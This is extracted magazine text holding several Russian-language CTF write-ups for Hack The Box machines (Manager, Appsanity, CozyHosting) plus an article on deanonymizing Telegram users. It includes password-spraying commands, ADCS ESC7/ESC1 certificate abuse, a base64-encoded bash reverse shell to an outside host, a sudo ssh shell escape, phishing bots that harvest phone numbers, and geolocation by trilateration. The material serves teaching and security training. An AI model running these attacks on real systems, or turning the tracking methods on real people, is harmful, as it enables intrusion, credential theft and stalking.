 • 1433 — служба Microsoft SQL Server;
 • 3268 (LDAP) — для доступа к Global Catalog от кли ента к контроллеру;
 • 3269 (LDAPS) — для дос тупа к Global Catalog от кли ента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб-служ бы AD DS.

Сертификаты некоторых служб рас крывают не толь ко имя домена, но и имя
машины. Допол ним запись в файле /etc/hosts:


10.10.11.236 manager.htb dc01.manager.htb dc01


ÒÎ×ÊÀ ÂÕÎÄÀ

Так как дос тупна служ ба SMB, пер вым делом про веряем гос тевую авто риза-
цию  без  ввода  пароля.  Для  этого  удобно  исполь зовать  утилиту
CrackMapExec.


crackmapexec smb 10.10.11.236 -u anonymous -p ''



                       Результат проверки

Гостевая авторизация доступна! А это значит, что можно использовать тех-
нику перебора RID, что бы получить названия групп и имена поль зовате лей
домена. Делается это при помощи все того же CrackMapExec.


crackmapexec smb 10.10.11.236 -u anonymous -p '' --rid-brute 5000





                     Результат перебора RID

Сохраняем список пользователей в файл. Теперь можно попытаться подоб-
рать пароли к существующим акка унтам. Протес тировать стоит как пустой
пароль, так и имена поль зователей в качестве паролей. Причем под бирать
можно как на службе SMB, так и на служ бе MS SQL.


crackmapexec smb 10.10.11.236 -u users.txt -p users.txt
--no-bruteforce --continue-on-success


crackmapexec mssql 10.10.11.236 -u users.txt -p users.txt
--no-bruteforce --continue-on-success





                    Результат подбора пароля

Пароли были ука заны с заг лавной буквы, сменим все строчными и повторим
перебор.


crackmapexec smb 10.10.11.236 -u users.txt -p small_users.txt
--no-bruteforce --continue-on-success





                    Результат подбора пароля

В ито ге получаем валидную учетную запись operator:operator.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



      ПОВЫШАЕМ ПРИВИЛЕГИИ В ACTIVE
          DIRECTORY ЧЕРЕЗ ТЕХНИКУ ESC7





ÒÎ×ÊÀ ÎÏÎÐÛ

При аналогичном перебо ре служ бы MS SQL для поль зователя operator видим
другие результаты, но получен ная ошибка подтверждает валид ность учетных
данных.


crackmapexec smb 10.10.11.236 -u users.txt -p small_users.txt
--no-bruteforce --continue-on-success





                    Результат подбора пароля

Для работы с MS SQL  в  Linux можно исполь зовать удоб ный  скрипт
mssqlclient из набора скриптов impacket.


impacket-mssqlclient -port 1433 manager.htb/operator:operator@10.10.
11.236 -windows-auth





                  Под ключение к службе MS SQL

Первым делом проверяем, имеет ли пользователь хоть какую-нибудь адми-
нистратив ную роль. Сде лать это можно за один зап рос.


SELECT is_srvrolemember('sysadmin'), is_srvrolemember('dbcreator'),
is_srvrolemember('bulkadmin'), is_srvrolemember('diskadmin'),
is_srvrolemember('processadmin'), is_srvrolemember('serveradmin'),
is_srvrolemember('setupadmin'), is_srvrolemember('securityadmin');



                  Резуль тат выполнения запроса

У этого пользовате ля нет ролей, что очень печаль но. Я попробовал проверить
про цедуры и  другие функции, которые можно  эксплуатировать,  чтобы
повысить при виле гии в службе или получить удаленное выпол нение кода,
но результатов это не дало. Зато можно исполь зовать функцию xp_dirtree
для отоб ражения листинга в ука занном катало ге.


EXEC xp_dirtree 'C:', 1, 1;





                    Со держимое диска C

Видим каталог inetpub и вспо мина ем про работа ющий на той же машине
веб-сервер. На этом этапе можно получить всю структуру сайта.


EXEC xp_dirtree 'C:\inetpub', 1, 1;


EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;





             Содержимое каталогов inetpub\wwwroot

В корне сай та лежит бэкап, о котором знать ранее мы не могли. Скачива ем
его и просматриваем файлы с нас тройками. В файле .old-conf.xml есть
учетные дан ные.


wget http://manager.htb/website-backup-27-07-23-old.zip





                Содержимое файла .old-conf.xml

Первым делом нуж но про верить валидность найден ной учетки.


crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'




                    Про верка учет ных данных

Учетная запись валидна, а значит, можно получить содержимое группы
Remote Management Users. Пользователи в этой груп пе могут авторизовать ся
по WinRM.


crackmapexec smb 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
--groups 'Remote Management Users'




           Содер жимое груп пы Remote Management Users

Этот пользователь присутствует в группе, поэто му авторизуемся по WinRM
и забираем первый флаг.


evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'





                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



      ПОВЫШАЕМ ПРИВИЛЕГИИ В ACTIVE
          DIRECTORY ЧЕРЕЗ ТЕХНИКУ ESC7





ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

По лучаем всю информацию о пользователе и отмечаем группу Certicate
Service DCOM Access. Это обратило мое внимание на служ бу сертифика ции
Active Directory.


whoami /all





                  Информация о пользователе

Для проверки AD CS есть удобный инструмент Certipy, который не только
позволя ет работать с центром сертифика ции, но и помогает автоматически
про верять известные уяз вимости (параметр -vulnerable).


certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
-vulnerable -stdout





                     Результат ана лиза AD CS

В выводе утилиты указано, что присутству ет уязвимость ESC7. Это значит, что
поль зователь имеет опасные привилегии на самом центре сертификации.


ESC7 AD CS
Ñëóæ áû ñåðòèôèêàòîâ Active Directory (AD CS) — это настраиваемые
службы для выдачи сертификатов и управления ими в системах безопас-
ности. Здесь использует ся технология откры тых клю чей.
  Цен тры сер тификации AD CS выдают сертификаты с параметрами,
которые определяются шаб лонами. Эти шаб лоны представляют собой
наборы политик регистрации и предоп ределенных параметров сертификата
и содержат разные све дения, например:
 • срок дей ствия сер тификата;
 • пред назна чение сертификата;
 • способ ука зания субъекта;
 • ко му разрешено зап росить сер тификаты.

Уязвимость ESC7 заключается в том, что у неп ривилегирован ного поль-
зователя есть права на защищаемый объ ект самого центра сертификации.
В таких случаях пользователь может наз начить себе право «Управление сер-
тификатами», акти виро вать и использовать шаблон сертификата SubCA, так
как он уязвим к технике ESC1. Дело в том, что запрос выдачи сертификатов
SubCA будет одобрен только администра тором, а пользователи с правами
«Управле ние центром сер тификации» и «Управление сертификатами» могут
отправ лять под тверждение на запросы выдачи сер тификатов, даже если они
завершились неудач но.
  Но для начала обно вим запись в файле /etc/hosts, куда вне сем и имя
центра сер тификации.


10.10.11.236 manager.htb dc01.manager.htb manager-DC01-CA

Те перь по намеченному плану назначаем пользователю право «Управле ние
сертификатами».


certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p
'R4v3nBe5tD3veloP3r!123' -add-officer raven




                  Результат выполнения команды

Ко ман да выполнена успешно, поэто му перехо дим к активации шаблона сер-
тификата SubCA. Этот шаб лон может быть уже активирован. Чтобы это про-
верить, используем параметр -list-templates.


certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p
'R4v3nBe5tD3veloP3r!123' -list-templates





                    Активные шаб лоны сертификатов

Нуж ный шаблон присутс твует в списке, переходим к эксплуатации ESC1.


ESC1 AD CS
Техника ESC1 поз воля ет повысить привилегии через шаблон сертификата,
но должны выпол няться следующие требования:
 1. У шаблона сер тификата в свой стве msPKI-Certificate-Name-Flag
   установлен флаг ENROLLEE_SUPPLIES_SUBJECT, что поз воляет зап-
  рашивающе му самому установить атри бут SAN (subjectAltName).
 2. Сер тификат можно использовать для аутентификации кли ента  (client
  authentication).
 3. Те кущий  пользователь  имеет  пра ва  для  регистра ции  сертификата
   без утвержде ния менеджера AD CS.

Что делать с треть им требованием? Все прос то, у нас ведь есть поль-
зователь-менеджер, который раз решит выдачу сер тификата. Получается, эта
тех ника основана на воз можнос ти изме нения SAN сертификата, что поз воля-
ет выпустить сер тификат для любого пользователя домена, включая админис-
тратора домена!
  Давай зап росим сертификат SubCA, где в атрибуте SAN укажем поль-
зователя administrator.


certipy req -ca 'manager-DC01-CA' -u raven@manager.htb -p
'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -template SubCA
-upn administrator@manager.htb





                  Результат запроса сертифика та

Зап рос завершился ошиб кой, но мы знаем его номер — 25. Одобрим заявку
на выдачу сер тифика та и заново зап росим его.


certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p
'R4v3nBe5tD3veloP3r!123' -issue-request 25





                      Одоб рение заявки


certipy req -ca 'manager-DC01-CA' -u raven@manager.htb -p
'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -retrieve 25





                  Пов торный зап рос сер тифика та

Имея сер тификат пользователя, поз воляющий пройти аутентифика цию, мож-
но получить NT-хеш пароля пользователя.


UnPAC the hash
Суть техники UnPAC the hash в том, что, имея сер тификат, позволяющий поль-
зователю пройти аутентификацию, мож но получить TGT-билет. В нем будет
структура PAC_CREDENTIAL_INFO, а она содержит клю чи NTLM. Так как в этих
операци ях задейство ван Kerberos, нам дополнительно тре буется синхро-
низировать вре мя с удаленным сервером. После получения TGT-билета и NT-
хеша вер нем вре мя обратно.


sudo ntpdate -s 10.10.11.236
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
sudo ntpdate -s ntp.org





                       По луче ние NT

С полученным хешем подклю чаем ся к сер веру от имени адми нистра тора
и забираем пос ледний флаг.


evil-winrm -i 10.10.11.236 -u administrator -H
ae5064c2f62317332c88629e025924ef





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом рай тапе я покажу, как мож но при-
менять тех нику перехвата DLL для повыше-
ния привилегий в Windows. Но прежде мы
атакуем веб-сайт и получим RCE через
ком бинацию из SSRF и уязвимос ти при заг-             RalfHacker                                                                                             hackerralf8@gmail.com
рузке файлов.


Наша цель — получение прав суперпользователя на машине Appsanity с учеб-
ной площадки Hack The Box. Уро вень машины заявлен слож ный.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.238    appsanity.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел три открытых пор та:
 • 80 и 443 — веб-сервер Microsoft IIS 10.0;
 • 5985 — служба удаленного управления WinRM.

На сервере все го одна точка входа — это веб-сер вер. При этом, как отоб-
ражено в выводе Nmap, происхо дит редирект на сайт http://meddigi.htb.
Добав ляем этот домен в /etc/hosts и идем смотреть сайт.


10.10.11.238 appsanity.htb meddigi.htb





                   Главная стра ница сайта meddigi.htb

Сра зу же запускаем ска нер поддоменов.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю лег кий и очень быс трый ﬀuf. При запус ке указываем сле-
дующие парамет ры:
 • -u — URL;
 • -w — словарь;
 • -t — количество потоков;
 • -H — HTTP-заголо вок.



Запускаем сканиро вание:


ffuf -u "https://meddigi.htb/" -H 'Host: FUZZ.meddigi.htb' -t 128 -w
subdomains-top1million-110000.txt



                Ре зультат ска ниро вания под доменов

Спустя пару минут получаем еще один поддомен, который тоже добавляем
в /etc/hosts.


10.10.11.238 appsanity.htb meddigi.htb portal.meddigi.htb





                Глав ная страница сайта portal.meddigi.htb

Те перь перей дем к анализу самих сайтов.


ÒÎ×ÊÀ ÂÕÎÄÀ

Ïîâûøåíèå ïðèâèëåãèé íà ñàéòå
На первом сайте, в отли чие от второго, есть возможность регистрации.





              Форма авто ризации сай та meddigi.htb

Авторизо вав шись на сайте, получаем стра ницу про филя, где есть несколько
полей ввода и даже возможность отпра вить сооб щение кому-то.





                 Содержимое страницы Prole

Но ничего интересного най ти не удалось, поэто му вер немся в самое начало
и просмотрим все запросы в Burp History. В глаза бросился параметр
Acctype в зап росе на авторизацию.





                      Зап рос на авто ризацию

Вый дем из своего профиля на сайте, активиру ем перехват запроса в Burp
Proxy и снова пройдем авто ризацию. Но в этот раз в перехваченном запросе
изме ним значение параметра Acctype на 2.





                      Зап рос на авто ризацию





                     Про филь пользователя

На этот раз мы авторизовались как доктор, и страница профиля содержит
новые элементы.


Îáõîä àâòîðèçàöèè
Но снова ничего интересного найти не уда лось. Однако здесь использует ся
сессия AspNet, а значит, можно проверить токен доступа на другом сайте.
Вдруг исполь зуется общий механизм авториза ции. Для этого копируем
cookie с сай та, где мы уже авторизо вались, и используем их на portal.
meddigi.htb.





                    Запрос к portal.meddigi.htb





                Глав ная страница сайта portal.meddigi.htb

И получа ем дос туп к дру гому сайту от имени авторизованного пользователя.
Но так как куки вставлялись через Burp, мы не сможем гулять по всему сай ту.
Давай откроем бра узер и закинем токен дос тупа в хра нили ще Cookies.





                        Хра нилище бра узера

Те перь у нас есть полноценный доступ ко всем механиз мам веб-при ложе ния.
На одной из страниц разрешают сохранять документ по ссылке, что может
при вести к SSRF. На другой странице можно загружать файлы, а это потен-
циально ведет к воз можнос ти залить шелл.





               Содержимое стра ницы Prescriptions





               Содержимое страницы examreport




                                     Продолжение статьи →
ВЗЛОМ





Сегодня мы с тобой порабо таем с фрей-
мвор ком Spring Boot и про ведем инъекцию
команд, чтобы получить доступ к веб-сер-
веру. Зах ватив сес сию, покопаемся в базе
дан ных в поисках учетных дан ных, а при             RalfHacker                                                                                             hackerralf8@gmail.com
повыше нии привиле гий применим тех нику
GTFOBins для SSH.


Наша цель — получение прав суперпользователя на машине CozyHosting
с учебной пло щадки Hack The Box. Уровень сложности машины — легкий.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.230   cozyhosting.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб-сервер Nginx 1.18.0.

По обыкновению, сразу переходим к прос мотру сай тов на веб-сервере.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

На сай те ничего интересного най ти не уда лось, поэтому приступим к ска-
нированию скры тых катало гов и файлов.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков.



Запускаем сканер:


feroxbuster -u http://cozyhosting.htb/ -t 256 -w files_interesting.
txt





        Ре зультат ска нирования катало гов с помощью feroxbuster

В отче те видим закрытую админку (/admin), страницу авторизации (/login),
а также каталог /actuator.
   Spring Boot Actuator — это подпроект Spring Boot Framework. Он исполь-
зует эндпоинты HTTP для пре доставления опе ративной информа ции о любом
запущенном при ложении. Основное преимущество этой библиотеки в том,
что адми нистра тор получает показа тели работоспособ ности и мониторинга
из готовых к работе при ложений. К тому же Actuator — это удобное средство
для сбо ра метрик и информирова ния о состоянии базы данных. Первым
делом про верим конечные точки Actuator.


curl http://cozyhosting.htb/actuator | jq





                     Конечные точки Actuator

Те перь мож но обратить ся к каждой из них и получить информацию о той
или иной стра нице. К примеру, /actuator/sessions отоб разит спи сок
существующих в данный момент сес сий на сай те.


curl http://cozyhosting.htb/actuator/sessions | jq





                 Список идентификаторов сес сий

Эндпо инт /actuator/mappings даст нам кар ту сайта.


curl http://cozyhosting.htb/actuator/mappings | jq





                     Список стра ниц сайта





               Список страниц сай та (про должение)

Отмечаем для себя интересную страницу /executessh, принимающую POST-
данные. Это потенциаль но путь к уда ленному исполнению кода. Также в скане
не было страницы /addhost. Что бы получить к доступ к этим адресам, сна-
чала нужно авторизовать ся.


ÒÎ×ÊÀ ÎÏÎÐÛ

У нас есть несколь ко иден тифика торов сессий, некоторые из них для неав-
торизованных пользователей, а некото рые для пользователя kanderson.
Откроем в браузе ре средства разработки, перей дем к нас трой кам при ложе-
ния и в локальном хранили ще развернем сох раненные  cookies. Затем
выбираем из списка текущий сайт и меня ем зна чение JSESSIONID. После
обновле ния страницы перехо дим к закрытой до этого странице /admin.





            Локальное хранили ще приложения в бра узе ре





                         Страница /admin

Здесь есть фор ма для проверки соеди нения SSH, видимо, она и обращается
к странице /executessh. Дела ем тестовый зап рос и перехватываем данные
в Burp Proxy. Так как адрес сервера и имя пользователя, скорее все го,
прос то передаются команде SSH в командную строку, используем символ ;
для раз деления «команд».





                  Резуль тат выполнения запроса

Видим сообщение об ошиб ке command not found, так как реальная команда
была отде лена сим волом ;. Теперь передаем самую обычную нагрузку
для инъекции команд ОС.





                  Резуль тат выполнения запроса

В отве те получаем часть вывода выполненной команды id. Так как проверка
прош ла успешно, откры ваем листенер pwncat-cs -lp 4321 и выпол няем
реверс-шелл:


/bin/bash -i >& /dev/tcp/10.10.16.18/4321 0>&1

Закоди руем его в Base64 и передадим в виде вот такой конструкции:


echo '/bin/bash -i >& /dev/tcp/10.10.16.18/4321 0>&1' | base64 -w0


echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE4LzQzMjEgMD4mMQo=
 |base64 -d | bash





                  Резуль тат выполнения запроса

Но снова получим ошибку, на этот раз свя занную с наличием в нагрузке про-
белов. Заменить их очень просто. К при меру, можно использовать пос-
ледовательность ${IFS}, которая вос принимается опе рационной системой
как разделитель по умол чанию, то есть пробел. Снова выполняем запрос и на
этот раз получаем сессию от имени пользователя app.





                    Сессия поль зователя app


ÏÐÎÄÂÈÆÅÍÈÅ

В домаш нем катало ге учетной записи находим само приложение.




                  Содержимое каталога app

Так как это файл .jar, мы можем его декомпилиро вать и проанализи ровать
исходный код. Для заг рузки файла с удален ного хос та используем pwncat-cs.
Для этого сначала комбинаци ей клавиш Ctrl-D выходим в основное меню лис-
тенера, коман дой download скачиваем файл и коман дой back воз вращаемся
обратно в сессию.


                           Загрузка файла

Первым делом разархивиру ем все фай лы и проверим несколько важ ных
строк вроде passw, secret и token.




                    По иск подстро ки passw

И находим какой-то пароль в файле application.properties. Давай пос-
мотрим все содержимое это го фай ла.





             Со держимое файла application.properties

Мы нашли учетные данные для подклю чения к СУБД PostgreSQL. Не забываем
при менить этот пароль к другим пользователям в системе, хотя в этот раз
ничего и не получается. Подключимся к базе cozyhosting и пос мотрим,
какие там есть таблицы.


psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost:5432/cozyhosting"


\dt





                  Таблицы в базе дан ных cozyhosting

Наибо лее интересна нам таб лица users, получим из нее все записи.


select * from users;





                  Содержимое таб лицы users

Это хеши bcrypt, и нам нуж но их взло мать. Для перебора при помощи hashcat
ему надо будет указать соответствующий режим. Если мы его не знаем, мож-
но поискать в справ ке:


hashcat --example | grep '\$2a\$' -B12 -A1





                         Справка hashcat

По лучаем режим 3200, его необходимо указать в параметре -m при запус ке
hashcat.


hashcat -m 3200 -a 0 hashes.txt rockyou.txt



                     Результат работы hashcat

По лучаем один пароль, который снова пробуем использовать для логина
от имени системных пользователей. Их список можно узнать из файла /etc/
passwd.




                Со держимое файла /etc/passwd

По лучаем возможность под клю чаться по SSH, а также использовать команду
su для сме ны юзера.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Один из самых частых методов повышения привилегий — через команды,
указанные в файле sudoers.




Файл /etc/sudoers в Linux содержит спис ки команд, которые разные группы
поль зовате лей могут выполнять от имени администратора системы. Можно
прос мотреть его как напрямую, так и при помощи команды sudo -l.





                       Настройки судоера

Те кущий пользователь может выполнить команду ssh в привилегированном
контексте. Первым делом про веряем наличие техник GTFOBins для SSH.




GTFOBins — это спи сок исполняемых фай лов Unix, которые можно исполь-
зовать для обхода локальных огра ничений безопас ности в неправильно нас-
троенных системах. Проект собирает информа цию о способах использовать
законные функции исполняемых фай лов Unix таким образом, чтобы получить
доступ к командным обо лочкам, повысить привиле гии или передать фай лы.





          Опи сание эксплуата ции SSH для получе ния шелла

Находим  три  подходящих  варианта  получе ния  командной  оболочки
при выпол нении команды SSH. Вторая най ден ная команда при исполь-
зовании sudo дает нам шелл в привилегирован ном контексте.


sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x





                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





Telegram   толь ко   кажется  аноним ным.
На деле существу ет мно жество методик
и инструмен тов для деанонимизации поль-
зователей мес сенджера, и именно о них
пойдет  речь  в  статье. Мы рассмотрим         Ильдар Кудашев                                                                                                         @Digitalntelligence
боты-ловушки, исполь зование специальных
сервисов, а так же другие методи ки.




                   В моем Telegram-канале я пишу о методах и инс-
                         тру ментах OSINT. Ну а для тех, кто хочет углу бить-
                        ся в тему, есть авторский курс.
                       Читай так же мой предыду щий материал о поис-
                        ке пользователей Telegram с помощью данных
                       из открытых источников: «Это он, деанон! Про-
                      биваем  пользователей  Telegram  по  открытым
                       источникам».



ÁÎÒÛ-ËÎÂÓØÊÈ

Для исполь зования этого способа деанонимизации потребу ется немного
социаль ной инже нерии. Методика работает по принципу фишинга: жертва
заходит в бот, и для дальнейшего его использования запрашивается отправ-
ка номера  телефона  (это  встроенная функция мессендже ра).  Далее,
в зависимости от фантазии создателя, бот либо игнорирует сообщения, либо
выполняет какие-то полезные функции, но главное — владелец робота
получает номер пользователя.





Са мое инте ресное, что у тебя нет ни малейшей необ ходимости писать с нуля
собствен ный  бот,  потому  что  есть  уже  готовые  решения. Например,
@protestchat_bot или @Checknumb_bot.
  Ре зультат  мож но  получить,  введя  ID  целевого  аккаунта  у  бота
@TgAnalyst_bot.
   Здесь же мож но про верить ID по базе, соб ранной тем же методом дру-
гими пользовате лями и основателями про екта.
  Однако луч ше, конечно, написать бот самос тоятельно, но и для этого есть
наработ ки — ре пози тории на GitHub. Ими мож но воспользоваться без редак-
туры, они позволят сразу соз дать несколько полноценных ботов «из коробки».
При этом ты можешь выб рать из несколь ких темати ческих вари антов бота:
нак рутка под писчи ков в инстаг раме, онлайн-знакомства, донат в компьютер-
ную игру и поиск информации по номеру телефона.




                     Сбор информации  о  час тной жизни  граждан
                       без  их  согласия  незаконен, пом ни об  этом.
                   В этой статье рассказывается о поис ке в откры-
                       тых источниках данных, которые люди оставляют
                        в публичном доступе сами. Но в любом случае
                      нужно соблюдать требования законодательства
                      и ува жать право граждан на сох ранение их при-
                         ватности. Поэтому информация в статье предос-
                        тавлена исключительно в ознакомитель ных целях.
                       Авторы и редак ция не несут ответственности
                        за любой возможный вред, причиненный исполь-
                       зованием материалов этой публикации.


Но пом ни, что основная задача — все-таки заставить пользователя поделить-
ся номером, поэтому действие это должно быть мотивировано. А мотивацию
мы выбираем индивиду ально под каждую цель, зна чит, и темати ка бота, ско-
рее все го, будет разной. Кто-то поделится номером ради оценки подер-
жанного автомоби ля, кто-то — что бы найти интерес ный фильм, кого-то заин-
тересует скачивание видео с YouTube. Поэтому боты придется создавать раз-
ные под каждый кейс, а основной код можно ско пиро вать из упомянутых
репози тори ев.


ÏÎËÓ×ÀÅÌ ÌÅÑÒÎÏÎËÎÆÅÍÈÅ

В 2019 году в Telegram появилась новая фун кция — «Люди рядом». Она поз-
воля ет пользовате лям делить ся сво им мес тоположением, чтобы находить
контакты и чаты поб лизости. Затем опре деле ние точного мес тоположения
убрали, однако локацию в ради усе 500 метров можно передавать до сих пор.





Ко неч но, OSINT-спе циалисты такую интересную возможность не упустили
и создали нес колько инструментов для эксплу атации фичи. Работа ют они
следующим образом.
  На рабочем аккаунте включает ся функция «Люди рядом» и задаются те
коор динаты, в которых предположи тельно находится цель. Каж дые 25 секунд
всем ближайшим к ука занной точке поль зователям будет отправляться TDLib
из Telegram. В него входит расстояние каждого ближайшего пользователя
до тво его местополо жения. Используя три рас стояния от трех раз ных точек,
можно вычислить местополо жение ближайшего пользовате ля.
  При этом будут найдены только те пользователи Telegram, у которых акти-
вирована функция «поблизости». По умол чанию она отключена. И конеч но,
для начала тебе необ ходимо иметь хотя бы пример ное представление о мес-
тонахож дении объ екта твоего интереса. Можно повторять поиск в нес кольких
местах, если исходная область слиш ком большая.





По добных сервисов я нашел три, принцип работы у них одинаковый:
 • Geogramint;
 • Telegram-nearby-map;
 • Telegram-Trilateration.


ÅÙÅ ÁÎËÜØÅ ÏÎÈÑÊÎÂÈÊÎÂ

В прош лой статье я уже писал про поисковики, способные искать в чатах
и каналах Telegram. В них можно вбить юзернейм, никнейм или ID цели: воз-
можно, эти идентификаторы где-то упо мина лись и мы получим дополнитель-
ную информацию. Так как база источников у этих сервисов разная, име ет
смысл поискать в каж дом. Поэто му я решил дополнить этот список.
 • Tgstat — пред назначен для адми нов телеграм-каналов, но чаще исполь-
   зуется как поисковая сис тема;
 • Telegramd — поис ковая система по мес сенджеру;
 • Kribrum — бес плат ный про дукт от круп ного сервиса для монито ринга СМИ
   и медиа.

Есть и поисковики, соз данные энтузиас тами на базе возможностей Google.
Ищут они по опре деленным ресурсам «Телег рама», где содержатся сооб-
щения и публикации:
 • Telegago;
 • cse.google.com (1);
 • cse.google.com (2).


ÀÐÕÈÂÛ

Те перь перей дем к другому аспекту телеграм-рас следований — деаноними-
зации владельцев телеграм-каналов. Неред ки случаи, когда автор канала
пуб ликует в постах, описании или заголов ке опре деленную информа цию,
касающуюся его личной жизни. В общем, любые сведения, которые могут
помочь в рассле довании. Позже он удаляет ее по причине, например, пере-
ориентации канала, а может, сведения и вовсе были опубликованы случайно.
  Поэто му у иссле дователя должны быть инстру менты, сохраняющие кон-
тент каналов и пре доставляющие дос туп к копиям. В некоторых случаях ему
помогут всем известные онлайн-архивы:
 • Archive.org — самый круп ный веб-архив в мире. Кстати, чтобы удобно ска-
   чивать  информацию   отту да,  можно   восполь зовать ся   ути литой
   waybackpack;
 • Archive.today — аль тер нативный вариант;
 • Archive.eu — быв ший европейский архив, недавно переехал. При поис ке
   ука жи дату, что бы увидеть архивы;
 • Webcitation — архив, который предоставля ет дос туп к страницам, сох-
   раненным другими поль зователями.

Также сто ит пос мотреть в кеширо ванных копи ях. Кроме того, есть и решения,
ориентированные конкретно на Telegram. Например, сайт Tgstat позволя ет
смот реть историю названий, описаний, ссылок и ленты канала. Невероятно
полез ный инс трумент.
   Если в Tgstat не нашлось ничего интерес ного, можно про лис тать ленту
пос тов в альтернатив ных сервисах:
 • Linkbaza;
 • Tgoop;
 • Telemetr.


ÄÅÀÍÎÍ ÏÎ ÑÒÈÊÅÐÓ

Ес ли ты поль зуешься стикерами в Telegram, знай, что в каждом сти кере
содержится ID авто ра. Думаю, ты замечал, что многие каналы создают фир-
менные стикерпаки. Имея в распоряжении стикерпак, мы можем из кода эле-
мента узнать ID его создателя. Процесс извлечения автоматизирован в боте
@SPOwnerBot, прос то переш ли ему сти кер.
  Полученный ID необязательно будет при надлежать владельцу канала
или его знакомо му, возможно, стикерпак заказали у стороннего дизайнера —
это нужно учи тывать.


ÈÇÓ×ÀÅÌ ÑÊÐÛÒÎÅ ÑÎÄÅÐÆÈÌÎÅ Â ÎÏÈÑÀÍÈÈ ÊÀÍÀËÀ

Ну и напоследок — еще одна интересная фича. Метод актуален в том случае,
если у нас есть ссылка на при ватный канал, в который нет воз можнос ти всту-
пить. Тогда единствен ное, что у нас имеется, — это предпросмотр в браузе-
ре.
  Однако Telegram часто скрывает часть описания канала, которая может
содержать полезные сведения. То есть в режиме предварительного прос-
мотра ты будешь видеть неполное опи сание канала. Однако на самом деле
информация там представлена полностью, но скрыта в коде эле мента. Чтобы
ее увидеть:
 1. Нажми правую кнопку мыши.
 2. Найди элемент tgme_page_description . В зависимос ти от браузе ра он
   находит ся в раз ных мес тах, раскры вай различные кус ки кода, чтобы обна-
   ружить его. Нап ример, в Яндекс Браузере он находится здесь:


body > div.tgme_page_wrap > div.tgme_body_wrap > div > div.tgme_page_
description





Этот эле мент содержит полное описание канала, в отличие от пользователь-
ского варианта.


ÂÛÂÎÄÛ

Пе речис ленные методы откры вают интерес ные возможности для деаноними-
зации поль зователей и каналов, однако глав ное — помнить: сбор информа-
ции о физических лицах незаконен, будь осторожен при работе с персональ-
ными дан ными и не используй полученные све дения во вред.
ПРИВАТНОСТЬ





16 марта 2021 года к заседа нию окружно го
суда города Тампа по Zoom подключился
обвиняемый: бритый наголо щуп лый 17-
